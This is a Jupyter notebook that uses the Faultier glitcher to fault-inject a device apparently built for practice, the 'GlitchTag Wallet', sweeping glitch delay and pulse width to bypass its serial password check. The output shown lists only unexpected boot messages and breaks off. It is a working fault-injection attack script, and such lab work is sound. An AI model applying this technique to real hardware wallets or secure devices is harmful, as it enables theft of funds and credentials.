In [99]:
import faultier
import serial
import time

ft = faultier.Faultier()
ser = serial.Serial(ft.get_serial_path(), baudrate=115200)
ser.timeout = 0.05


In [ ]:
ser.reset_input_buffer()

ft.configure_glitcher(
    power_cycle_output = faultier.OUT_MUX0,
    power_cycle_length = 300000
)

ft.power_cycle()
d = ser.readline()
print(d)
ser.write(b"TEST\r\n")
d = ser.readline()
print(d)

b'Welcome to GlitchTag Wallet! Please enter your password:\r\n'
b'Wrong password. Try again.\r\n'


In [ ]:
import struct
ft.configure_glitcher(
    power_cycle_output = faultier.OUT_MUX0,
    power_cycle_length = 300000,
    trigger_source = faultier.TRIGGER_IN_EXT0,
    trigger_type = faultier.TRIGGER_FALLING_EDGE,
    glitch_output= faultier.OUT_CROWBAR
)

expected_boot_message = b'Welcome to GlitchTag Wallet! Please enter your password:\r\n'

start = int(((1/115200)/(1/250000000)) * 13.4)
while True:
    print("Restart")
    for delay in range(start, start+10000):
        for pulse in range(3, 13):
            # Flush potentially left-over data in serial input buffer
            ser.reset_input_buffer()

            # Power cycle
            ft.configure_glitcher(
                power_cycle_output = faultier.OUT_MUX0,
                power_cycle_length = 300000
            )

            ft.power_cycle()

            data = ser.read(len(expected_boot_message))
            if(data != expected_boot_message):
                # Unexpected failure
                print(f"Unexpected boot message: {data}")
                continue

            # Send password
            ser.write(b"TEST")


            ft.configure_glitcher(
                power_cycle_output = faultier.OUT_NONE,
                trigger_source = faultier.TRIGGER_IN_EXT0,
                trigger_type = faultier.TRIGGER_FALLING_EDGE,
                glitch_output= faultier.OUT_CROWBAR
            )

            ft.glitch_non_blocking(delay, pulse)
            ser.write(b"\n")

            # IMPORTANT
            ft.glitch_check_non_blocking_response()
            result = ser.read(len(b"Wrong password. Try again.\r\n"))
            if b"Wrong" in result:
                time.sleep(0.03)
                continue
            if b"Welcome" in result:
                time.sleep(0.03)
                continue
            if result == b"":
                time.sleep(0.03)
                continue
            print(f"{delay} {pulse} Success! {result}{ser.read(100)}")
            # print(ser.read(50))
            # time.sleep(0.3)


Restart
Unexpected boot message: b'nd!\x00UART device does noWelcome to GlitchTag Wallet! Please'
Unexpected boot message: b'nter your password:\r\nWelcome to GlitchTag Wallet! Please e'
Unexpected boot message: b'nter your passworWelcome to GlitchTag Wallet! Please enter'
Unexpected boot message: b'r password:\r\nWelcome to GlitchTag Wallet! Please enter you'
Unexpected boot message: b'r password:\r\nWelcome to GlitchTag Wallet! Please enter you'
Unexpected boot message: b'r password:\r\nWelcome to GlitchTag Wallet! Please enter you'
Unexpected boot message: b'r password:\r\nWelcome to GlitchTag Wallet! Please enter you'
Unexpected boot message: b'r password:\r\nWelcome to GlitchTag Wallet! Please enter you'
Unexpected boot message: b'r password:\r\nWelcome to GlitchTag Wallet! Please enter you'
Unexpected boot message: b'r password:\r\nWelcome to GlitchTag Wallet! Please enter you'
Unexpected boot message: b'r password:\r\nWelcome to GlitchTag Wallet! Please enter you'
Unexpected boo